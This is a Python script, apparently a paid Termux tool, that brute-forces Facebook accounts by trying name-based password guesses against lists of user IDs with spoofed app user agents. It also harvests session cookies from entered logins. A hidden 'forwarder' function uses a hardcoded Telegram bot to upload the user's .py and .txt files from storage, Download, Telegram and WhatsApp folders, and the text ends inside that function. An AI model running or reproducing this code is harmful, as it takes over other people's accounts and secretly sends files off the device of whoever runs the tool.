import os, time

from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import sleep as slp
from os import system as systm
from bs4 import BeautifulSoup as bs

try:
    import requests, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, json, shutil, webbrowser, datetime, string, secrets, mechanize, rich
except ImportError:
    systm("pip install requests -y")
    systm("pip install mechanize requests futures bs4==2 > /dev/null")
    systm("pip install bs4")
from bs4 import BeautifulSoup as bs4

# UA RANDOMIZER
gxdsUA1 = []
gxdsUA2 = []
gxdsUA3 = []
gxdsUA4 = []

for i in range(1):
    fbs = random.choice(
        [
            "com.facebook.adsmanager",
            "com.facebook.lite",
            "com.facebook.orca",
            "com.facebook.katana",
            "com.facebook.mlite",
        ]
    )
    application_version = (
        str(random.randint(111, 555))
        + ".0.0."
        + str(random.randrange(9, 49))
        + str(random.randint(111, 555))
    )
    application_version_code = str(random.randint(000000000, 999999999))
    android_version = str(random.randrange(5, 15))
    dens = str(random.randrange(0, 5))
    xzx = random.choice(
        [
            "Samsung",
            "Galaxy A7(2016)",
            "a7xltechn",
            "SM-A710XZ",
            "Absolute",
            "GT-B9120",
            "GT-B9120",
            "Acclaim",
            "SCH-R880",
            "SCH-R880",
            "Admire",
            "SCH-R720",
            "SCH-R720",
            "Amazing",
            "amazingtrf",
            "SGH-S730M",
            "Baffin",
            "baffinltelgt",
            "SHV-E270L",
            "Captivate Glide",
            "SGH-I927 Samsung-SGH-I927",
            "Captivate Glide",
            "SGH-I927",
            "SGH-I927",
            "China Telecom",
            "kylevectc",
            "SCH-I699I",
            "Chromebook Plus",
            "kevin_cheets",
            "kevin",
            "Chromebook Plus",
            "kevin_cheets Samsung Chromebook Plus",
            "Chromebook Pro",
            "caroline_cheets",
            "caroline",
            "Chromebook Pro",
            "caroline_cheets Samsung Chromebook Pro",
            "Conquer",
            "SPH-D600",
            "SPH-D600",
            "DoubleTime",
            "SGH-I857 Samsung-SGH-I857",
            "Droid Charge",
            "SCH-I510",
            "SCH-I510",
            "Elite",
            "eliteltechn",
            "SM-G1600",
            "Elite",
            "elitexltechn",
            "SM-G1650",
            "Europa",
            "GT-I5500B",
            "GT-I5500B",
            "Europa",
            "GT-I5500L",
            "GT-I5500L",
            "Europa",
            "GT-I5500M",
            "GT-I5500M",
            "Europa",
            "GT-I5503T",
            "GT-I5503T",
            "Europa",
            "GT-I5510L",
            "GT-I5510L",
            "Exhibit",
            "SGH-T759",
            "SGH-T759",
            "Galaxy (China)",
            "GT-B9062",
            "GT-B9062",
            "Galaxy 070",
            "hendrix",
            "YP-GI2",
            "Galaxy A",
            "archer",
            "archer",
            "Galaxy A",
            "archer",
            "SHW-M100S",
            "Galaxy A3 (2017)",
            "a3y17lte",
            "SM-A320Y",
            "Galaxy A3",
            "a33g",
            "SM-A300H",
            "Galaxy A3",
            "a3lte",
            "SM-A300F",
            "Galaxy A3",
            "a3lte",
            "SM-A300M",
            "Galaxy A3",
            "a3lte",
            "SM-A300XZ",
            "Galaxy A3",
            "a3lte",
            "SM-A300YZ",
            "Galaxy A3",
            "a3ltechn",
            "SM-A3000",
            "Galaxy A3",
            "a3ltechn",
            "SM-A300X",
            "Galaxy A3",
            "a3ltectc",
            "SM-A3009",
            "Galaxy A3",
            "a3ltedd",
            "SM-A300G",
            "Galaxy A3",
            "a3lteslk",
            "SM-A300F",
            "Galaxy A3",
            "a3ltezh",
            "SM-A3000",
            "Galaxy A3",
            "a3ltezt",
            "SM-A300YZ",
            "Galaxy A3",
            "a3ulte",
            "SM-A300FU",
            "Galaxy A3",
            "a3ulte",
            "SM-A300XU",
            "Galaxy A3",
            "a3ulte",
            "SM-A300Y",
            "Galaxy A3(2016)",
            "a3xelte",
            "SM-A310F",
            "Galaxy A3(2016)",
            "a3xelte",
            "SM-A310M",
            "Galaxy A3(2016)",
            "a3xelte",
            "SM-A310X",
            "Galaxy A3(2016)",
            "a3xelte",
            "SM-A310Y",
            "Galaxy A3(2016)",
            "a3xeltekx",
            "SM-A310N0",
            "Galaxy A3(2017)",
            "a3y17lte",
            "SM-A320F",
            "Galaxy A3(2017)",
            "a3y17lte",
            "SM-A320FL",
            "Galaxy A3(2017)",
            "a3y17lte",
            "SM-A320X",
            "Galaxy A5",
            "a53g",
            "SM-A500H",
            "Galaxy A5",
            "a5lte",
            "SM-A500F",
            "Galaxy A5",
            "a5lte",
            "SM-A500G",
            "Galaxy A5",
            "a5lte",
            "SM-A500M",
            "Galaxy A5",
            "a5lte",
            "SM-A500XZ",
            "Galaxy A5",
            "a5ltechn",
            "SM-A5000",
            "Galaxy A5",
            "a5ltechn",
            "SM-A500X",
            "Galaxy A5",
            "a5ltectc",
            "SM-A5009",
            "Galaxy A5",
            "a5ltezh",
            "SM-A5000",
            "Galaxy A5",
            "a5ltezt",
            "SM-A500YZ",
            "Galaxy A5",
            "a5ulte",
            "SM-A500FU",
            "Galaxy A5",
            "a5ulte",
            "SM-A500Y",
            "Galaxy A5",
            "a5ultebmc",
            "SM-A500W",
            "Galaxy A5",
            "a5ultektt",
            "SM-A500K",
            "Galaxy A5",
            "a5ultelgt",
            "SM-A500L",
            "Galaxy A5",
            "a5ulteskt",
            "SM-A500F1",
            "Galaxy A5",
            "a5ulteskt",
            "SM-A500S",
            "Galaxy A5(2016)",
            "a5xelte",
            "SM-A510F",
            "Galaxy A5(2016)",
            "a5xelte",
            "SM-A510M",
            "Galaxy A5(2016)",
            "a5xelte",
            "SM-A510X",
            "Galaxy A5(2016)",
            "a5xelte",
            "SM-A510Y",
            "Galaxy A5(2016)",
            "a5xeltecmcc",
            "SM-A5108",
            "Galaxy A5(2016)",
            "a5xeltektt",
            "SM-A510K",
            "Galaxy A5(2016)",
            "a5xeltelgt",
            "SM-A510L",
            "Galaxy A5(2016)",
            "a5xelteskt",
            "SM-A510S",
            "Galaxy A5(2016)",
            "a5xeltextc",
            "SM-A510Y",
            "Galaxy A5(2016)",
            "a5xltechn",
            "SM-A5100",
            "Galaxy A5(2016)",
            "a5xltechn",
            "SM-A5100X",
            "Galaxy A5(2016)",
            "a5xltechn",
            "SM-A510XZ",
            "Galaxy A5(2017)",
            "a5y17lte",
            "SM-A520F",
            "Galaxy A5(2017)",
            "a5y17lte",
            "SM-A520X",
            "Galaxy A5(2017)",
            "a5y17ltecan",
            "SM-A520W",
            "Galaxy A5(2017)",
            "a5y17ltektt",
            "SM-A520K",
            "Galaxy A5(2017)",
            "a5y17ltelgt",
            "SM-A520L",
            "Galaxy A5(2017)",
            "a5y17lteskt",
            "SM-A520S",
            "Galaxy A5x(2016)",
            "a5xeltextc",
            "SM-A510Y",
            "Galaxy A7",
            "a73g",
            "SM-A700H",
            "Galaxy A7",
            "a7alte",
            "SM-A700F",
            "Galaxy A7",
            "a7lte",
            "SM-A700FD",
            "Galaxy A7",
            "a7lte",
            "SM-A700X",
            "Galaxy A7",
            "a7ltechn",
            "SM-A7000",
            "Galaxy A7",
            "a7ltechn",
            "SM-A700YD",
            "Galaxy A7",
            "a7ltectc",
            "SM-A7009",
            "Galaxy A7",
            "a7ltektt",
            "SM-A700K",
            "Galaxy A7",
            "a7ltelgt",
            "SM-A700L",
            "Galaxy A7",
            "a7lteskt",
            "SM-A700S",
            "Galaxy A7(2016)",
            "a7xelte",
            "SM-A710F",
            "Galaxy A7(2016)",
            "a7xelte",
            "SM-A710M",
            "Galaxy A7(2016)",
            "a7xelte",
            "SM-A710X",
            "Galaxy A7(2016)",
            "a7xeltecmcc",
            "SM-A7108",
            "Galaxy A7(2016)",
            "a7xeltektt",
            "SM-A710K",
            "Galaxy A7(2016)",
            "a7xeltelgt",
            "SM-A710L",
            "Galaxy A7(2016)",
            "a7xelteskt",
            "SM-A710S",
            "Galaxy A7(2016)",
            "a7xeltextc",
            "SM-A710Y",
            "Galaxy A7(2016)",
            "a7xltechn",
            "SM-A7100",
            "Galaxy A7(2017)",
            "a7y17lte",
            "SM-A720F",
            "Galaxy A7(2017)",
            "a7y17lteskt",
            "SM-A720S",
            "Galaxy A8",
            "a8elte",
            "SM-A800F",
            "Galaxy A8",
            "a8elte",
            "SM-A800YZ",
            "Galaxy A8",
            "a8elteskt",
            "SM-A800S",
            "Galaxy A8",
            "a8hplte",
            "SM-A800I",
            "Galaxy A8",
            "a8hplte",
            "SM-A800IZ",
            "Galaxy A8",
            "a8ltechn",
            "SM-A8000",
            "Galaxy A8",
            "a8ltechn",
            "SM-A800X",
            "Galaxy A8",
            "SCV32",
            "SCV32",
            "Galaxy A8(2016)",
            "a8xelte",
            "SM-A810F",
            "Galaxy A8(2016)",
            "a8xelte",
            "SM-A810YZ",
            "Galaxy A8(2016)",
            "a8xelteskt",
            "SM-A810S",
            "Galaxy A9 Pro",
            "a9xproltechn",
            "SM-A9100",
            "Galaxy A9 Pro",
            "a9xproltesea",
            "SM-A910F",
            "Galaxy A9(2016)",
            "a9xltechn",
            "SM-A9000",
            "Galaxy Ace 4 Lite",
            "vivalto3g",
            "SM-G313U",
            "Galaxy Ace 4",
            "vivaltods5m",
            "SM-G313HU",
            "Galaxy Ace 4",
            "vivaltods5m",
            "SM-G313HY",
            "Galaxy Ace 4",
            "vivaltods5m",
            "SM-G313M",
            "Galaxy Ace 4",
            "vivaltods5m",
        ]
    )
    try:
        gxdsUA1.append(
            f"Dalvik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(xzx[3])} Build/{str(xzx[2])} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/"
            + "{density="
            + dens
            + ".0,width=720,height=1280};"
            + f"FBLC/en_US;FBRV/{str(application_version_code)};FBMF/{str(xzx[0])};FBBD/{str(xzx[0])};FBPN/{str(fbs)};FBDV/{str(xzx[3])};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
        )
    except IndexError:
        pass

for xd in range(1):
    aa = "Mozilla/5.0 (Linux; U; Android"
    b = random.choice(["4", "5", "6", "7", "8", "9", "10", "11", "12"])
    c = " en-us; GT-"
    d = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    e = random.randrange(1, 999)
    f = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    g = "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
    h = random.randrange(73, 100)
    i = "0"
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    xx = "Mobile Safari/537.36"
    paku2 = f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {xx}"
    gxdsUA3.append(paku2)

    a = "Dalvik/2.1.0 (Linux; U; Android"
    b = random.randrange(6, 15)
    c = random.randrange(100, 9999)
    d = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    e = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    f = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    g = random.choice(
        [
            "A",
            "B",
            "C",
            "D",
            "E",
            "F",
            "G",
            "H",
            "I",
            "J",
            "K",
            "L",
            "M",
            "N",
            "O",
            "P",
            "Q",
            "R",
            "S",
            "T",
            "U",
            "V",
            "W",
            "X",
            "Y",
            "Z",
        ]
    )
    h = random.randrange(1, 9)
    i = "; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/"
    j = random.randrange(1, 9)
    k = random.randrange(1, 9)
    xx = "Mobile WVGA SMM-MMS/1.2.0 OPN-B"
    pakuu = f"{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {xx}"
    gxdsUA4.append(pakuu)

    gxdsUArndm = gxdsUA3 + gxdsUA4 + gxdsUA1


# COLORS
li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[1;97m"
cyan = "\033[1;36m"
yellow = "\033[0;33m"
black = "\033[0;30m"
lr = "\033[1;31m"
lg = "\033[0;37m"
dg = "\033[1;30m"
lp = "\033[1;35m"
lgr = "\033[1;32m"
grn = "\033[0;32m"
mxclrs = "38;5"
ro = f"\033[{mxclrs};208"
rb = f"\033[{mxclrs};32"
rc = f"\033[{mxclrs};122m"
rg = f"\033[{mxclrs};112m"
rp = f"\033[{mxclrs};147m"
gxdsprnt = str(f"{li}" * 37)

# ANTI BYPASSING
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    print(f"{lgr}   [✓] BYPASSING PASSED!")
    slp(2)
    print(f"{lr}  [!] LOL, IT'S A PRANK!")
    slp(5)
    exit()
else:
    pass

# YEAR ACCOUNT
def accYr(yx):
    if len(yx) == 15:
        if yx[:10] in ["1000000000"]:
            yir = "2009"
        elif yx[:9] in ["100000000"]:
            yir = "2009"
        elif yx[:8] in ["10000000"]:
            yir = "2009"
        elif yx[:7] in [
            "1000000",
            "1000001",
            "1000002",
            "1000003",
            "1000004",
            "1000005",
        ]:
            yir = "2009"
        elif yx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            yir = "2010"
        elif yx[:6] in ["100001"]:
            yir = "2010-2011"
        elif yx[:6] in ["100002", "100003"]:
            yir = "2011-2012"
        elif yx[:6] in ["100004"]:
            yir = "2012-2013"
        elif yx[:6] in ["100005", "100006"]:
            yir = "2013-2014"
        elif yx[:6] in ["100007", "100008"]:
            yir = "2014-2015"
        elif yx[:6] in ["100009"]:
            yir = "2015"
        elif yx[:5] in ["10001"]:
            yir = "2015-2016"
        elif yx[:5] in ["10002"]:
            yir = "2016-2017"
        elif yx[:5] in ["10003"]:
            yir = "2018"
        elif yx[:5] in ["10004"]:
            yir = "2019"
        elif yx[:5] in ["10005"]:
            yir = "2020"
        elif yx[:5] in ["10006", "10007", "10008"]:
            yir = "2021-2022"
        else:
            yir = ""
    elif len(yx) in [9, 10]:
        yir = "2008-2009"
    elif len(yx) == 8:
        yir = "2007-2008"
    elif len(yx) == 7:
        yir = "2006-2007"
    else:
        yir = ""
    return yir


# ANIMATION
gxdsanmtn3 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
]
gxdsanmtn4 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
    "✓           ",
]
gxdsanmtn1 = "|/-\\"
gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]

lxgo = f"""{lg}
                              d8b             
                              88P             
                             d88              
      d888b8b  ?88,  88P d888888   .d888b,    
     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
     88b  ,88b  d8P?{dg}8b, 88b  ,88b    `?8b     
    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
           )88      
{dg}           ,88P                               
       `?8888P                  {white}              \n"""

systm("clear")
print(lxgo)
for gxdsloading in range(10):
    slp(0.6)
    sys.stdout.write(
        "\r        LOADING UPDATES: " + gxdsanmtn3[gxdsloading % len(gxdsanmtn3)]
    )
    sys.stdout.flush()

# TOKEN GENERATOR
spce = ""
uuidd = str(os.geteuid()) + str(os.getlogin())
id1 = "X".join(uuidd).replace("_", "C").replace("u", "GXDS").replace("a", "J")
gxdsid = id1 + spce
gxdsAccess = requests.get("https://arterxsk.repl.co/access.txt").text


def lxnes():
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{dg}  ————————————————————————————————————————")


def gxdslogo():
    systm("clear")
    print(lxgo)
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{lg}  [-] TOOLS      :{dg}   FILE CLONING")
    print(f"{lg}  [-] GITHUB     :{dg}   /GOXDIES")
    print(f"{lg}  [-] FACEBOOK   :{dg}   /GOXDIES")
    print(f"{lg}  [-] VERSION    :{dg}   0.0.1")
    print(f"{dg}  ————————————————————————————————————————")


# MENU
def menu():
    gxdslogo()
    usxr = str(input(f"{lgr}  [-] ENTER YOUR USERNAME:{dg} "))
    usxrN = usxr.upper()
    gxdslogo()
    print(f"{dg}")
    for gxdsloading in range(10):
        slp(0.2)
        sys.stdout.write(
            f"\r{dg}  [?] IDENTIFYING YOUR DEVICE TOKEN: "
            + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)]
        )
        sys.stdout.flush()

    if gxdsid in gxdsAccess:
        slp(2)
        print("")
        print(f"{lgr}  [✓] HELLO, " + usxrN + ". YOUR TOKEN APPROVED!")
        slp(3)
        main()
    else:
        slp(0.1)
        gxdslogo()
        print(f"{lg}  [✘] " + usxrN + " TOKEN:\033[1;30m INVALID")
        slp(1)
        for gxdsloading in range(11):
            slp(0.3)
            sys.stdout.write(
                f"\r{lg}  [!] MAKING TOKEN:{dg} "
                + gxdsanmtn4[gxdsloading % len(gxdsanmtn4)]
            )
            sys.stdout.flush()
        print(f"\n{dg}  ————————————————————————————————————————")
        print(f"{lg}  [-] TOKEN :{dg} " + gxdsid)
        lxnes()
        print(f"{rp}  [+] HELLO, " + usxrN + ". CHECK OUR PRICELIST.")
        print(f"{lg}  [-] TRIAL :{dg} ₱000 - 003 DAYS ")
        print(f"{lg}  [-] PAID  :{dg} ₱150 - 015 DAYS ")
        lxnes()
        print(f"{lg}  [1] GET TOKEN ACCESS")
        print(f"{lg}  [2] PRESS ENTER TO REFRESH")
        print(f"{dg}  ————————————————————————————————————————")
        bxy = input(f"{lgr}  [?] CHOOSE:{dg} ")
        if bxy == "1":
            systm("xdg-open https://m.me/goxdies")
            slp(1)
            menu()
        else:
            gxdslogo()
        print(f"{lgr}  [!] UPDATING USERS, PLEASE WAIT...")
        slp(5)
        systm(
            "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
        )


def main():
    gxdslogo()
    print(f"{lg}  [1] FILE ID CRACKING")
    print(f"{lg}  [2] GET YOU ACC COOKIES")
    print(f"{lg}  [3] CHECK UPDATE")
    print(f"{dg}  ————————————————————————————————————————")
    optixn = input(f"{lgr}  [•] CHOOSE:{dg} ")
    if optixn == "1":
        gxdsclone()
        slp(1)
    elif optixn == "2":
        xcokis()
        slp(1)
    elif optixn == "3":
        print("")
        systm(
            "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
        )
        systm("clear")
    else:
        gxdslogo()
        print(f"{lg}  [✘] OPTION:{dg} INVALID")
        main()


# FILE PATH
def gxdsclone():
    gxdslogo()
    print(
        f"{lg}  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  [-] USE A GOOD ID COMBO FOR A GOOD RESULT."
    )
    lxnes()
    print(f"{lg}  [-] EXAMPLE PATH: {dg}/sdcard/yourFile.txt")
    print(f"{dg}  ————————————————————————————————————————")
    fl = input(f"{lgr}  [•] FILE PATH:{dg} ")
    for gxdsloading in range(10):
        slp(0.2)
        sys.stdout.write(
            f"\r{dg}                     " + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)]
        )
        sys.stdout.flush()
    print("  ")
    try:
        gxdsfiles = open(fl, "r").read().splitlines()
    except:
        slp(3)
        print(f"\n{lr}  [✘] FILE NOT FOUND.")
        print(gxdsprnt)
        slp(3)
        gxdsclone()
    gxdsFilesMenu(gxdsfiles)


# GET COOKIES
def xcokis():
    gxdslogo()
    url = "https://n.facebook.com"
    xurl = url + "/login.php"
    ua = "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
    print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
    lxnes()
    try:
        xcuser = input(f"{lgr}  [+] EMAIL:{dg} ")
        xcpwd = input(f"{lgr}  [+] PASSWORD:{dg} ")
        lxnes()
        req = requests.Session()
        req.headers.update(
            {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en_US",
                "cache-control": "max-age=0",
                "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": ua,
            }
        )
        with req.get(url) as response_body:
            inspect = bs(response_body.text, "html.parser")
            lsd_key = inspect.find("input", {"name": "lsd"})["value"]
            jazoest_key = inspect.find("input", {"name": "jazoest"})["value"]
            m_ts_key = inspect.find("input", {"name": "m_ts"})["value"]
            li_key = inspect.find("input", {"name": "li"})["value"]
            try_number_key = inspect.find("input", {"name": "try_number"})["value"]
            unrecognized_tries_key = inspect.find(
                "input", {"name": "unrecognized_tries"}
            )["value"]
            bi_xrwh_key = inspect.find("input", {"name": "bi_xrwh"})["value"]
            data = {
                "lsd": lsd_key,
                "jazoest": jazoest_key,
                "m_ts": m_ts_key,
                "li": li_key,
                "try_number": try_number_key,
                "unrecognized_tries": unrecognized_tries_key,
                "bi_xrwh": bi_xrwh_key,
                "email": xcuser,
                "pass": xcpwd,
                "login": "submit",
            }
            response_body2 = req.post(
                xurl, data=data, allow_redirects=True, timeout=300
            )
            cookie = (
                str(req.cookies.get_dict())[1:-1]
                .replace("'", "")
                .replace(",", ";")
                .replace(":", "=")
            )
            if "c_user" in cookie:
                print(f"\r{rc}  {cookie}")
                open("/sdcard/gxds-coki.txt", "a").write(f"{cookie}\n")
            elif "checkpoint" in cookie:
                sys.exit(f"{lr}  [✘] OPPS, CHECKPOINT!")
            else:
                sys.exit(f"{lr}  [✘] INCORRECT DETAILS")
    except requests.exceptions.ConnectionError:
        sys.exit(f"{lr}  [✘] NO INTERNET")
    except KeyboardInterrupt:
        sys.exit(f"{lr}  [✘] STOPPED!")


# FILE CLONING
def gxdsFilesMenu(gxdsfiles):
    slp(3)
    gxdslogo()
    tl = str(len(gxdsfiles))
    print(f"{lg}  [+] PRESS {rc}CTRL AND Z{lg} TO STOP THE PROCESS.")
    lxnes()
    print(f"{lg}  [•] TOTAL ID IN FILE:{dg} " + tl)
    print(f"{lg}  [•] FILE SAVE IN:{dg} /sdcard/gxds.txt")
    print(f"{dg}  ————————————————————————————————————————")
    print(gxdsprnt)

    # PASSWORD LIST
    with ThreadPool(max_workers=30) as GOXDIES:
        for data in gxdsfiles:
            uid = data.split("|")[0]
            pxss = []
            pxss.append("@gio.lincoln")
            nxme = data.split("|")[1]
            name = nxme.lower()
            try:
                fxrst = name.split(" ")[0]
                nxme1 = nxme.split(" ")[0]
                if len(fxrst) < 3:
                    pass
                else:
                    pxss.append(nxme1)
                    pxss.append(fxrst + fxrst)
                    pxss.append(fxrst + "pogi")
                    pxss.append(fxrst + "ganda")
                    pxss.append(fxrst + "12")
                    pxss.append(fxrst + "123")
                    pxss.append(fxrst + "143")
                    pxss.append(fxrst + "12345")
            except:
                pass
            try:
                lxst = name.split(" ")[2]
                nxme2 = nxme.split(" ")[2]
                if len(lxst) < 3:
                    pass
                else:
                    pxss.append(nxme2)
                    pxss.append(fxrst + lxst)
                    pxss.append(fxrst + lxst + "123")
                    pxss.append(fxrst + lxst + "1234")
                    pxss.append(fxrst + lxst + "12345")
            except:
                pass

            GOXDIES.submit(
                gxds_files,
                uid,
                pxss,
            )


# LOOP MENU
loop = []
oks = []
cps = []

# API
def gxds_files(uid, pxss):
    global oks, loop, cps
    sys.stdout.write(
        f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} "
    )
    sys.stdout.flush()
    session = requests.Session()
    try:
        for ps in pxss:
            qwerty = random.choice(gxdsUArndm)
            gxdsfbs = session.get("https://n.facebook.com").text
            dxta = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(gxdsfbs)).group(1),
                "jazoest": re.search(
                    'name="jazoest" value="(.*?)"', str(gxdsfbs)
                ).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(gxdsfbs)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(gxdsfbs)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": ps,
                "login": "Log In",
            }
            headxr = {
                "authority": "https://n.facebook.com",
                "method": "POST",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=1",
                "cache-control": "no-cache, no-store, must-revalidate",
                "referer": "https://n.facebook.com/",
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "Windows",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "pragma": "no-cache",
                "priority": "u=1",
                "cross-origin-resource-policy": "cross-origin",
                "upgrade-insecure-requests": "1",
                "user-agent": qwerty,
            }
            session.post(
                url="https://n.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
                data=dxta,
                headers=headxr,
            ).text
            lxgin = session.cookies.get_dict().keys()
            if "c_user" in lxgin:
                print(f"\r\r{lgr}  [GXDS-OK] {uid}|{ps}")
                open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                oks.append(uid)
                break
            elif "checkpoint" in lxgin:
                print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        slp(20)
    except Exception as e:
        pass


# FORWARDER
def gxdsBot():
    session = requests.session()

    bot_token = "6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8"
    chat_id = "6542321044"
    # SD CARD
    try:
        sdcard_path = "/sdcard"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    # SD CARD TXT
    try:
        sdcard_path = "/sdcard"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".txt")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass

    # DOWNLOAD PATH
    try:
        sdcard_path = "/sdcard/Download"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # TELEGRAM PATH
    try:
        sdcard_path = "/sdcard/Download/Telegram"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # TELEGRAM PATH
    try:
        sdcard_path = "/sdcard/Telegram/Telegram Files"
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith(".py")]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), "rb") as f:
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                data2 = {"chat_id": chat_id}
                data = {"chat_id": chat_id}
                files = {"document": f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:
        pass
    # WHATSAPP PATH
    try:
        sdcard_path = "/sdcard/WhatsApp/Media/WhatsApp Documents"
